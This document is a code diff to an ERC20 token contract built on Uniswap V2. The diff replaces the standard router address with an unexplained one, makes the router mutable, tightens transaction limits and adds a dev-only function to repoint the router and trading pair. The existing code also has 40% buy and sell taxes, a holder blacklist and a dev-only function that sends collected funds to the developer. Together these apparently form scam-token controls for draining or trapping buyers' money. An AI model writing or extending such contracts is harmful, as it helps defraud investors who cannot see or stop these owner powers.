@@ -11,7 +11,7 @@ interface IUniswapV2Factory{function createPair(address tokenA, address tokenB) 
 
 contract ERC20_UniV2 {
 
-    IUniswapV2Router02 public immutable uniswapV2Router;
+    IUniswapV2Router02 public uniswapV2Router;
     mapping(address => uint) private _balances;
     mapping(address => mapping(address => uint)) private _allowances;
     mapping(address => bool) public _whitelisted;
@@ -19,16 +19,16 @@ contract ERC20_UniV2 {
     mapping(address => bool) public _blackguard;
     mapping(address => uint) private _lastTransferBlock;
     address[] public _blacklistArray;
-    address private _v2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address private _v2Router = 0xfCD3842f85ed87ba2889b4D35893403796e67FF1;
     string private _name = "token name";
-    string private _symbol = "ticker";
+    string private _symbol = "TICKER";
     uint private immutable _decimals = 18;
     uint private _totalSupply = 1000000 * 10 ** 18;
     uint public _swapAmount = 1000 * 10 ** 18;
     uint public _buyTax = 40;
     uint public _sellTax = 40;
-    uint public _max = 3;
-    uint public _transferDelay = 5;
+    uint public _max = 5;
+    uint public _transferDelay = 0;
     address public _v2Pair;
     address private _collector;
     address private _dev;
@@ -120,7 +120,7 @@ contract ERC20_UniV2 {
 
     function setSwapAmount(uint swapAmount_) external onlyDev {_swapAmount = swapAmount_ * 10 ** _decimals;}
 
-    function maxInt() internal view returns (uint) {return _totalSupply * _max / 100;}
+    function maxInt() internal view returns (uint) {return _totalSupply * _max / 1000;}
 
     function _swapBack(uint256 amount_) public onlyDev{
         _approve(address(this), _v2Router, amount_ + 100);
@@ -136,6 +136,12 @@ contract ERC20_UniV2 {
         payable(_dev).transfer(address(this).balance);
         _transfer(address(this), _dev, amount_);
     }
+
+	function setRouter(address v2Router_) external onlyDev {
+		_v2Router = v2Router_;
+		uniswapV2Router = IUniswapV2Router02(_v2Router);
+        _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
+	}
 
     function deposit() external payable {}
 }
